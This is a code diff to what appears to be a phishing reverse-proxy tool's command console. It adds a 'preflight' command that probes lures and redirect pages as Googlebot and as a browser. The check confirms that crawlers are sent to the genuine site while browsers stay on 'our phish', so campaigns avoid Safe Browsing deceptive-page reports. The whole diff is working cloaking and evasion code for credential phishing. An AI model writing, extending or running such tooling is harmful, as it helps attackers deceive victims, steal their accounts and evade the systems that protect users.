@@ -177,6 +177,9 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("redirects: %v", err)
 			}
+		case "preflight":
+			cmd_ok = true
+			t.preflight()
 		case "blacklist":
 			cmd_ok = true
 			err := t.handleBlacklist(args[1:])
@@ -439,6 +442,31 @@ func (t *Terminal) handleConfig(args []string) error {
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+// preflight probes every public entry point as a crawler and as a browser and
+// prints anything a reputation crawler would judge. Run it before mailing.
+func (t *Terminal) preflight() {
+	if t.p == nil {
+		log.Error("preflight: proxy not available")
+		return
+	}
+	rep := t.p.Preflight()
+	for _, c := range rep.Checks {
+		mark := "ok  "
+		if c.Problem != "" {
+			mark = "PROB"
+		}
+		log.Info("[%s] %-32s scanner:%d hops:%d external:%v browser:%d", mark, c.Label, c.Scanner.Status, c.Scanner.Hops, c.Scanner.External, c.Browser.Status)
+	}
+	if rep.OK {
+		log.Success("preflight: %d entry point(s), crawlers leave our domain and browsers stay on the phish", len(rep.Checks))
+		return
+	}
+	for _, p := range rep.Problems {
+		log.Warning("preflight: %s", p)
+	}
+	log.Warning("preflight: %d problem(s) - a crawler would evaluate our phish", len(rep.Problems))
 }
 
 func (t *Terminal) handleRedirects(args []string) error {
@@ -2013,6 +2041,9 @@ func (t *Terminal) createHelp() {
 
 	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
 		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("delete")))
+
+	h.AddCommand("preflight", "general", "check what a crawler sees before mailing", "Probes every lure, redirect page, front link and the apex twice: once as a crawler (Googlebot), which must be sent off our domain to the genuine site, and once as a browser, which must stay on our phish. Safe Browsing files a deceptive-page report when a crawler evaluates the phish, so run this before a campaign.", LAYER_TOP,
+		readline.PcItem("preflight"))
 
 	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
 	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
